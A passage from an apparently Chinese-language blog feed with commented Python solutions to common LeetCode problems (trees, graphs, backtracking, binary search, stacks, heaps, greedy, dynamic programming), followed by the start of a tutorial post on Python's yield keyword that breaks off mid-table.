<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def inorderTraversal(self, root: TreeNode) -&gt; List[int]:</span><br><span class="line">        # 初始化栈和结果列表</span><br><span class="line">        stack, rst = [root], []  # stack 用于模拟递归调用栈，rst 用于存储遍历结果</span><br><span class="line"></span><br><span class="line">        # 开始遍历</span><br><span class="line">        while stack:  # 当栈不为空时，继续遍历</span><br><span class="line">            i = stack.pop()  # 弹出栈顶元素</span><br><span class="line"></span><br><span class="line">            # 如果当前元素是 TreeNode 类型</span><br><span class="line">            if isinstance(i, TreeNode):</span><br><span class="line">                # 将右子树、当前节点的值、左子树按顺序压入栈</span><br><span class="line">                stack.extend([i.right, i.val, i.left])  # 注意顺序：右 -&gt; 值 -&gt; 左</span><br><span class="line"></span><br><span class="line">            # 如果当前元素是整数类型（节点的值）</span><br><span class="line">            elif isinstance(i, int):</span><br><span class="line">                rst.append(i)  # 将节点的值加入结果列表</span><br><span class="line"></span><br><span class="line">        # 返回结果列表</span><br><span class="line">        return rst</span><br></pre></td></tr></table></figure>
<ul>
<li>二叉树的最大深度</li>
</ul>
<p>给定一个二叉树 <code>root</code> ，返回其最大深度。二叉树的 <strong>最大深度</strong> 是指从根节点到最远叶子节点的最长路径上的节点数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxDepth(self, root: Optional[TreeNode]) -&gt; int:</span><br><span class="line">        if not root: return 0</span><br><span class="line">        return max(self.maxDepth(root.left),self.maxDepth(root.right))+1</span><br></pre></td></tr></table></figure>
<h1>图论</h1>
<ul>
<li>岛屿数量</li>
</ul>
<p>给你一个由 <code>'1'</code>（陆地）和 <code>'0'</code>（水）组成的的二维网格，请你计算网格中岛屿的数量。岛屿总是被水包围，并且每座岛屿只能由水平方向和/或竖直方向上相邻的陆地连接形成。此外，你可以假设该网格的四条边均被水包围。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [</span><br><span class="line">  [&quot;1&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;0&quot;],</span><br><span class="line">  [&quot;1&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;0&quot;],</span><br><span class="line">  [&quot;0&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;],</span><br><span class="line">  [&quot;0&quot;,&quot;0&quot;,&quot;0&quot;,&quot;1&quot;,&quot;1&quot;]</span><br><span class="line">]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def numIslands(self, grid: List[List[str]]) -&gt; int:</span><br><span class="line">        n_l = 0  # 初始化岛屿数量为 0</span><br><span class="line"></span><br><span class="line">        # 遍历整个网格</span><br><span class="line">        for i in range(len(grid)):</span><br><span class="line">            for j in range(len(grid[0])):</span><br><span class="line">                # 如果当前单元格是陆地（&#x27;1&#x27;），则开始 DFS 遍历</span><br><span class="line">                if grid[i][j] == &#x27;1&#x27;:</span><br><span class="line">                    self.landpaint(grid, i, j)  # 标记当前岛屿的所有陆地</span><br><span class="line">                    n_l += 1  # 岛屿数量加 1</span><br><span class="line"></span><br><span class="line">        # 返回岛屿数量</span><br><span class="line">        return n_l</span><br><span class="line"></span><br><span class="line">    # DFS 函数：标记当前岛屿的所有陆地</span><br><span class="line">    def landpaint(self, grid, x, y):</span><br><span class="line">        # 将当前陆地标记为已访问（&#x27;2&#x27;）</span><br><span class="line">        grid[x][y] = &#x27;2&#x27;</span><br><span class="line"></span><br><span class="line">        # 检查下方单元格</span><br><span class="line">        if x + 1 &lt; len(grid) and grid[x + 1][y] == &#x27;1&#x27;:</span><br><span class="line">            self.landpaint(grid, x + 1, y)</span><br><span class="line"></span><br><span class="line">        # 检查右方单元格</span><br><span class="line">        if y + 1 &lt; len(grid[0]) and grid[x][y + 1] == &#x27;1&#x27;:</span><br><span class="line">            self.landpaint(grid, x, y + 1)</span><br><span class="line"></span><br><span class="line">        # 检查上方单元格</span><br><span class="line">        if x - 1 &gt;= 0 and grid[x - 1][y] == &#x27;1&#x27;:</span><br><span class="line">            self.landpaint(grid, x - 1, y)</span><br><span class="line"></span><br><span class="line">        # 检查左方单元格</span><br><span class="line">        if y - 1 &gt;= 0 and grid[x][y - 1] == &#x27;1&#x27;:</span><br><span class="line">            self.landpaint(grid, x, y - 1)</span><br></pre></td></tr></table></figure>
<ul>
<li>腐烂的橘子</li>
</ul>
<p>在给定的 <code>m x n</code> 网格 <code>grid</code> 中，每个单元格可以有以下三个值之一：值 <code>0</code> 代表空单元格；值 <code>1</code> 代表新鲜橘子；值 <code>2</code> 代表腐烂的橘子。</p>
<p>每分钟，腐烂的橘子 <strong>周围 4 个方向上相邻</strong> 的新鲜橘子都会腐烂。返回 <em>直到单元格中没有新鲜橘子为止所必须经过的最小分钟数。如果不可能，返回 <code>-1</code></em> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def orangesRotting(self, grid: List[List[int]]) -&gt; int:</span><br><span class="line">        m,n=len(grid),len(grid[0])</span><br><span class="line">        fresh=0</span><br><span class="line">        q=[]</span><br><span class="line">        for i,row in enumerate(grid):</span><br><span class="line">            for j,x in enumerate(row):</span><br><span class="line">                if x==1:</span><br><span class="line">                    fresh+=1</span><br><span class="line">                elif x==2:</span><br><span class="line">                    q.append((i,j))</span><br><span class="line"></span><br><span class="line">        ans=0</span><br><span class="line">        while q and fresh:</span><br><span class="line">            ans+=1</span><br><span class="line">            tmp=q</span><br><span class="line">            q=[]</span><br><span class="line">            for x,y in tmp:</span><br><span class="line">                for i, j in (x - 1, y), (x + 1, y), (x, y - 1), (x, y + 1):  # 四方向</span><br><span class="line">                    if 0 &lt;= i &lt; m and 0 &lt;= j &lt; n and grid[i][j] == 1:  # 新鲜橘子</span><br><span class="line">                        fresh -= 1</span><br><span class="line">                        grid[i][j] = 2  # 变成腐烂橘子</span><br><span class="line">                        q.append((i, j))</span><br><span class="line">        return -1  if fresh else ans</span><br></pre></td></tr></table></figure>
<h1>回溯</h1>
<ul>
<li>全排列</li>
</ul>
<p>给定一个不含重复数字的数组 <code>nums</code> ，返回其 <em>所有可能的全排列</em> 。你可以 <strong>按任意顺序</strong> 返回答案。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def permute(self, nums: List[int]) -&gt; List[List[int]]:</span><br><span class="line">        # 定义 DFS 函数</span><br><span class="line">        def dfs(nums, size, depth, path, used, res):</span><br><span class="line">            # 如果当前深度等于数组大小，说明找到一个完整排列</span><br><span class="line">            if depth == size:</span><br><span class="line">                res.append(path[:])  # 将当前排列加入结果列表</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">            # 遍历数组中的每个元素</span><br><span class="line">            for i in range(size):</span><br><span class="line">                # 检查当前元素是否已经被使用过</span><br><span class="line">                if not used[i]:</span><br><span class="line">                    # 标记当前元素为已使用</span><br><span class="line">                    used[i] = True</span><br><span class="line">                    # 将当前元素加入路径</span><br><span class="line">                    path.append(nums[i])</span><br><span class="line">                    # 递归调用 DFS，继续生成下一个位置的元素</span><br><span class="line">                    dfs(nums, size, depth + 1, path, used, res)</span><br><span class="line">                    # 回溯：移除当前元素，恢复状态</span><br><span class="line">                    path.pop()</span><br><span class="line">                    used[i] = False</span><br><span class="line"></span><br><span class="line">        # 获取数组的长度</span><br><span class="line">        size = len(nums)</span><br><span class="line">        # 如果数组为空，直接返回空列表</span><br><span class="line">        if size == 0:</span><br><span class="line">            return []</span><br><span class="line"></span><br><span class="line">        # 初始化 used 数组和结果列表</span><br><span class="line">        used = [False] * size  # 记录元素是否被使用</span><br><span class="line">        res = []  # 结果列表，用于存储所有排列</span><br><span class="line"></span><br><span class="line">        # 调用 DFS 函数，开始生成排列</span><br><span class="line">        dfs(nums, size, 0, [], used, res)</span><br><span class="line"></span><br><span class="line">        # 返回结果列表</span><br><span class="line">        return res</span><br></pre></td></tr></table></figure>
<ul>
<li>子集</li>
</ul>
<p>给你一个整数数组 <code>nums</code> ，数组中的元素 <strong>互不相同</strong> 。返回该数组所有可能的子集（幂集）。解集 <strong>不能</strong> 包含重复的子集。你可以按 <strong>任意顺序</strong> 返回解集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def subsets(self, nums: List[int]) -&gt; List[List[int]]:</span><br><span class="line">        # 初始化结果列表</span><br><span class="line">        res = []</span><br><span class="line">        # 获取数组的长度</span><br><span class="line">        n = len(nums)</span><br><span class="line">        </span><br><span class="line">        # 定义回溯函数</span><br><span class="line">        def helper(i, tmp):</span><br><span class="line">            # 将当前子集加入结果列表</span><br><span class="line">            res.append(tmp)</span><br><span class="line">            # 遍历数组，生成新的子集</span><br><span class="line">            for j in range(i, n):</span><br><span class="line">                # 递归调用，更新子集</span><br><span class="line">                helper(j + 1, tmp + [nums[j]])</span><br><span class="line">        </span><br><span class="line">        # 调用回溯函数，从索引 0 和空子集开始</span><br><span class="line">        helper(0, [])</span><br><span class="line">        # 返回结果列表</span><br><span class="line">        return res</span><br></pre></td></tr></table></figure>
<h3 id="二分查找">二分查找</h3>
<ul>
<li>搜索插入位置</li>
</ul>
<p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def searchInsert(self, nums: List[int], target: int) -&gt; int:</span><br><span class="line">        left, right = 0, len(nums) - 1</span><br><span class="line">        </span><br><span class="line">        while left &lt;= right:</span><br><span class="line">            mid = (left + right) // 2</span><br><span class="line">            if nums[mid] == target:</span><br><span class="line">                return mid</span><br><span class="line">            elif nums[mid] &lt; target:</span><br><span class="line">                left = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                right = mid - 1</span><br><span class="line">        </span><br><span class="line">        return left  # left 位置即为插入位置</span><br></pre></td></tr></table></figure>
<ul>
<li>搜索二维矩阵</li>
</ul>
<p>给你一个满足下述两条属性的 <code>m x n</code> 整数矩阵：每行中的整数从左到右按非严格递增顺序排列。每行的第一个整数大于前一行的最后一个整数。给你一个整数 <code>target</code> ，如果 <code>target</code> 在矩阵中，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def searchMatrix(self, matrix: List[List[int]], target: int) -&gt; bool:</span><br><span class="line">        # 获取矩阵的行数和列数</span><br><span class="line">        m, n = len(matrix), len(matrix[0])</span><br><span class="line">        </span><br><span class="line">        # 初始化二分查找的左右边界</span><br><span class="line">        l, r = 0, m * n  # 将二维矩阵视为一维数组</span><br><span class="line">        </span><br><span class="line">        # 开始二分查找</span><br><span class="line">        while l &lt; r:</span><br><span class="line">            # 计算中间位置</span><br><span class="line">            mid = (l + r) &gt;&gt; 1  # 等价于 (l + r) // 2</span><br><span class="line">            # 将一维索引 mid 转换为二维索引</span><br><span class="line">            x = matrix[mid // n][mid % n]</span><br><span class="line">            </span><br><span class="line">            # 判断中间元素与目标值的关系</span><br><span class="line">            if x == target:</span><br><span class="line">                return True  # 找到目标值，返回 True</span><br><span class="line">            if x &lt; target:</span><br><span class="line">                l = mid + 1  # 目标值在右半部分</span><br><span class="line">            else:</span><br><span class="line">                r = mid  # 目标值在左半部分</span><br><span class="line">        </span><br><span class="line">        # 未找到目标值，返回 False</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>
<h1>栈</h1>
<ul>
<li>有效的括号</li>
</ul>
<p>给定一个只包括 <code>'('</code>，<code>')'</code>，<code>'&#123;'</code>，<code>'&#125;'</code>，<code>'['</code>，<code>']'</code> 的字符串 <code>s</code> ，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<ol>
<li>
<p>左括号必须用相同类型的右括号闭合。</p>
</li>
<li>
<p>左括号必须以正确的顺序闭合。</p>
</li>
<li>
<p>每个右括号都有一个对应的相同类型的左括号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def isValid(self, s: str) -&gt; bool:</span><br><span class="line">        dic = &#123;&#x27;)&#x27;:&#x27;(&#x27;,&#x27;]&#x27;:&#x27;[&#x27;,&#x27;&#125;&#x27;:&#x27;&#123;&#x27;&#125;</span><br><span class="line">        stack = []</span><br><span class="line">        for i in s:</span><br><span class="line">            if stack and i in dic:</span><br><span class="line">                if stack[-1] == dic[i]: stack.pop()</span><br><span class="line">                else: return False</span><br><span class="line">            else: stack.append(i)</span><br><span class="line">            </span><br><span class="line">        return not stack</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>最小栈</li>
</ul>
<p>设计一个支持 <code>push</code> ，<code>pop</code> ，<code>top</code> 操作，并能在常数时间内检索到最小元素的栈。实现 <code>MinStack</code> 类:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- `MinStack()` 初始化堆栈对象。</span><br><span class="line">- `void push(int val)` 将元素val推入堆栈。</span><br><span class="line">- `void pop()` 删除堆栈顶部的元素。</span><br><span class="line">- `int top()` 获取堆栈顶部的元素。</span><br><span class="line">- `int getMin()` 获取堆栈中的最小元素。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class MinStack:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.stack = []</span><br><span class="line">        self.min_stack = [math.inf]</span><br><span class="line"></span><br><span class="line">    def push(self, val: int) -&gt; None:</span><br><span class="line">        self.stack.append(val) </span><br><span class="line">        self.min_stack.append(min(val,self.min_stack[-1]))</span><br><span class="line"></span><br><span class="line">    def pop(self) -&gt; None:</span><br><span class="line">        self.stack.pop()</span><br><span class="line">        self.min_stack.pop()</span><br><span class="line"></span><br><span class="line">    def top(self) -&gt; int:</span><br><span class="line">        return self.stack[-1]</span><br><span class="line"></span><br><span class="line">    def getMin(self) -&gt; int:</span><br><span class="line">        return self.min_stack[-1]</span><br></pre></td></tr></table></figure>
<h3 id="堆">堆</h3>
<ul>
<li>数组中的第k个最大元素</li>
</ul>
<p>给定整数数组 <code>nums</code> 和整数 <code>k</code>，请返回数组中第 <code>**k**</code> 个最大的元素。请注意，你需要找的是数组排序后的第 <code>k</code> 个最大的元素，而不是第 <code>k</code> 个不同的元素。</p>
<p>你必须设计并实现时间复杂度为 <code>O(n)</code> 的算法解决此问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def findKthLargest(self, nums: List[int], k: int) -&gt; int:</span><br><span class="line">        # 定义快速选择函数</span><br><span class="line">        def quick_select(nums, k):</span><br><span class="line">            # 随机选择一个基准元素（pivot）</span><br><span class="line">            pivot = random.choice(nums)</span><br><span class="line">            </span><br><span class="line">            # 初始化三个列表/变量：</span><br><span class="line">            # - big：存储比 pivot 大的元素</span><br><span class="line">            # - equal：记录与 pivot 相等的元素个数</span><br><span class="line">            # - small：存储比 pivot 小的元素</span><br><span class="line">            big, equal, small = [], 0, []</span><br><span class="line">            </span><br><span class="line">            # 遍历数组，将元素分类</span><br><span class="line">            for num in nums:</span><br><span class="line">                if num &gt; pivot:</span><br><span class="line">                    big.append(num)  # 比 pivot 大的元素放入 big</span><br><span class="line">                elif num &lt; pivot:</span><br><span class="line">                    small.append(num)  # 比 pivot 小的元素放入 small</span><br><span class="line">                else:</span><br><span class="line">                    equal += 1  # 与 pivot 相等的元素计数</span><br><span class="line">            </span><br><span class="line">            # 如果 k 小于等于 big 的长度，说明第 k 个最大元素在 big 中</span><br><span class="line">            if k &lt;= len(big):</span><br><span class="line">                return quick_select(big, k)  # 递归在 big 中查找</span><br><span class="line">            </span><br><span class="line">            # 如果 k 大于 big 和 equal 的总长度，说明第 k 个最大元素在 small 中</span><br><span class="line">            if len(big) + equal &lt; k:</span><br><span class="line">                return quick_select(small, k - len(big) - equal)  # 递归在 small 中查找</span><br><span class="line">            </span><br><span class="line">            # 如果以上条件都不满足，说明第 k 个最大元素就是 pivot</span><br><span class="line">            return pivot</span><br><span class="line"></span><br><span class="line">        # 调用快速选择函数，返回第 k 个最大元素</span><br><span class="line">        return quick_select(nums, k)</span><br></pre></td></tr></table></figure>
<ul>
<li>前k个高频元素</li>
</ul>
<p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> ，请你返回其中出现频率前 <code>k</code> 高的元素。你可以按 <strong>任意顺序</strong> 返回答案。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def topKFrequent(self, nums: List[int], k: int) -&gt; List[int]:</span><br><span class="line">        count = collections.Counter(nums)</span><br><span class="line">        return [item[0] for item in count.most_common(k)]</span><br></pre></td></tr></table></figure>
<h3 id="贪心算法">贪心算法</h3>
<ul>
<li>买卖股票的最佳时期</li>
</ul>
<p>给定一个数组 <code>prices</code> ，它的第 <code>i</code> 个元素 <code>prices[i]</code> 表示一支给定股票第 <code>i</code> 天的价格。你只能选择 <strong>某一天</strong> 买入这只股票，并选择在 <strong>未来的某一个不同的日子</strong> 卖出该股票。设计一个算法来计算你所能获取的最大利润。返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 <code>0</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxProfit(self, prices: List[int]) -&gt; int:</span><br><span class="line">        profit = 0</span><br><span class="line">        low=high=prices[0]</span><br><span class="line">        for p in prices:</span><br><span class="line">            if p &lt; low: #对每个新的最低点来说，之前的最高点不再有效，需要结利</span><br><span class="line">                profit = max(profit, high-low)</span><br><span class="line">                low=high=p</span><br><span class="line">            elif p &gt; high:</span><br><span class="line">                high=p</span><br><span class="line">        profit = max(profit, high-low)</span><br><span class="line">        return profit</span><br></pre></td></tr></table></figure>
<ul>
<li>跳跃游戏</li>
</ul>
<p>给你一个非负整数数组 <code>nums</code> ，你最初位于数组的 <strong>第一个下标</strong> 。数组中的每个元素代表你在该位置可以跳跃的最大长度。判断你是否能够到达最后一个下标，如果可以，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def canJump(self, nums: List[int]) -&gt; bool:</span><br><span class="line">        if not nums :return False</span><br><span class="line">        maxlong,n= 0,len(nums)</span><br><span class="line">        for i in range(n):</span><br><span class="line">            if i&gt;maxlong:</span><br><span class="line">                return False</span><br><span class="line">            maxlong= max(i+nums[i],maxlong)</span><br><span class="line">        return True</span><br></pre></td></tr></table></figure>
<h1>动态规划</h1>
<ul>
<li>爬楼梯</li>
</ul>
<p>假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def climbStairs(self, n: int) -&gt; int:</span><br><span class="line">        a, b = 1, 1</span><br><span class="line">        for _ in range(n - 1):</span><br><span class="line">            a, b = b, a + b</span><br><span class="line">        return b</span><br></pre></td></tr></table></figure>
<ul>
<li>杨辉三角</li>
</ul>
<p>给定一个非负整数 *<code>numRows</code>，*生成「杨辉三角」的前 <em><code>numRows</code></em> 行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def generate(self, numRows: int) -&gt; List[List[int]]:</span><br><span class="line">        c = [[1] * (i + 1) for i in range(numRows)]</span><br><span class="line">        for i in range(2, numRows):</span><br><span class="line">            for j in range(1, i):</span><br><span class="line">                # 左上方的数 + 正上方的数</span><br><span class="line">                c[i][j] = c[i - 1][j - 1] + c[i - 1][j]</span><br><span class="line">        return c</span><br></pre></td></tr></table></figure>
<h1>多维动态规划</h1>
<ul>
<li>不同路径</li>
</ul>
<p>一个机器人位于一个 <code>m x n</code> 网格的左上角 （起始点在下图中标记为 “Start” ）。机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。问总共有多少条不同的路径？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def uniquePaths(self, m: int, n: int) -&gt; int:</span><br><span class="line">        f = [1] * n</span><br><span class="line">        for i in range(1, m):</span><br><span class="line">            for j in range(1, n):</span><br><span class="line">                f[j] += f[j - 1]</span><br><span class="line">        return f[n - 1]</span><br></pre></td></tr></table></figure>
<ul>
<li>最小路径和</li>
</ul>
<p>给定一个包含非负整数的 <code>*m* x *n*</code> 网格 <code>grid</code> ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。**说明：**每次只能向下或者向右移动一步。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def minPathSum(self, grid: List[List[int]]) -&gt; int:</span><br><span class="line">        # 如果网格为空，返回 0</span><br><span class="line">        if not grid or not grid[0]:</span><br><span class="line">            return 0</span><br><span class="line">        </span><br><span class="line">        # 获取网格的行数和列数</span><br><span class="line">        rows, columns = len(grid), len(grid[0])</span><br><span class="line">        </span><br><span class="line">        # 初始化动态规划数组 dp</span><br><span class="line">        dp = [[0] * columns for _ in range(rows)]</span><br><span class="line">        </span><br><span class="line">        # 起点的最小路径和就是 grid[0][0]</span><br><span class="line">        dp[0][0] = grid[0][0]</span><br><span class="line">        </span><br><span class="line">        # 初始化第一列的最小路径和</span><br><span class="line">        for i in range(1, rows):</span><br><span class="line">            dp[i][0] = dp[i - 1][0] + grid[i][0]</span><br><span class="line">        </span><br><span class="line">        # 初始化第一行的最小路径和</span><br><span class="line">        for j in range(1, columns):</span><br><span class="line">            dp[0][j] = dp[0][j - 1] + grid[0][j]</span><br><span class="line">        </span><br><span class="line">        # 填充 dp 数组的其余部分</span><br><span class="line">        for i in range(1, rows):</span><br><span class="line">            for j in range(1, columns):</span><br><span class="line">                # 当前点的最小路径和等于上方或左方的最小路径和加上当前点的值</span><br><span class="line">                dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]</span><br><span class="line">        </span><br><span class="line">        # 返回右下角的最小路径和</span><br><span class="line">        return dp[rows - 1][columns - 1]</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 基础</title>
    <url>/2025/02/04/Python-%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1>关键字</h1>
<h2 id="yield">yield</h2>
<p><code>yield</code> 是 Python 中的一个关键字，用于定义生成器函数（generator function）。生成器函数是一种特殊的函数，它可以逐步产生值，而不是一次性返回所有结果。<code>yield</code> 的作用是将函数变成一个生成器，每次调用生成器的 <code>__next__()</code> 方法时，函数会执行到 <code>yield</code> 语句并返回一个值，然后暂停执行，直到下一次调用。</p>
<hr>
<h3 id="yield-的基本用法"><strong>yield 的基本用法</strong></h3>
<h4 id="示例-1：简单的生成器函数">示例 1：简单的生成器函数</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = simple_generator()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 3</span></span><br></pre></td></tr></table></figure>
<ul>
<li>每次调用 <code>next(gen)</code>，函数会从上次暂停的地方继续执行，直到遇到下一个 <code>yield</code>。</li>
<li>当没有更多的值可以生成时，会抛出 <code>StopIteration</code> 异常。</li>
</ul>
<hr>
<h4 id="示例-2：使用-for-循环遍历生成器">示例 2：使用 for 循环遍历生成器</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 for 循环遍历生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> simple_generator():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<ul>
<li><code>for</code> 循环会自动处理 <code>StopIteration</code> 异常，因此不需要手动调用 <code>next()</code>。</li>
</ul>
<hr>
<h3 id="yield-的优势"><strong>yield 的优势</strong></h3>
<ol>
<li>
<p><strong>惰性求值</strong>：</p>
<ul>
<li>生成器不会一次性生成所有值，而是按需生成，节省内存。</li>
<li>适合处理大量数据或无限序列。</li>
</ul>
</li>
<li>
<p><strong>代码简洁</strong>：</p>
<ul>
<li>使用 <code>yield</code> 可以避免手动实现迭代器协议（<code>__iter__</code> 和 <code>__next__</code>）。</li>
</ul>
</li>
<li>
<p><strong>状态保持</strong>：</p>
<ul>
<li>生成器函数会记住上次执行的状态，下次调用时从上次暂停的地方继续。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="yield-的高级用法"><strong>yield 的高级用法</strong></h3>
<h4 id="示例-3：生成无限序列">示例 3：生成无限序列</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">infinite_sequence</span>():</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = infinite_sequence()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出: 2</span></span><br><span class="line"><span class="comment"># 可以无限调用 next(gen)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这个生成器会无限生成递增的整数。</li>
</ul>
<hr>
<h4 id="示例-4：使用-yield-实现斐波那契数列">示例 4：使用 <code>yield</code> 实现斐波那契数列</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>():</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line">gen = fibonacci()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">8</span><br><span class="line">13</span><br><span class="line">21</span><br><span class="line">34</span><br></pre></td></tr></table></figure>
<ul>
<li>这个生成器会无限生成斐波那契数列的值。</li>
</ul>
<hr>
<h4 id="示例-5：yield-from（委托生成器）">示例 5：<code>yield from</code>（委托生成器）</h4>
<p><code>yield from</code> 用于将生成器的控制权委托给另一个生成器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;Start&#x27;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> sub_generator()</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;End&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> main_generator():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">End</span><br></pre></td></tr></table></figure>
<ul>
<li><code>yield from</code> 可以简化生成器的嵌套调用。</li>
</ul>
<hr>
<h3 id="yield-与-return-的区别"><strong>yield 与 return 的区别</strong></h3>
<table>
<thead>
<tr>
<th>特性</th>
<th><code>yield</code></th>
<th><code>return</code></th>
</tr>
</thead>
<tbody>
<tr>
<td>返回值</td>
<td>每次生成一个值，函数暂停</td>
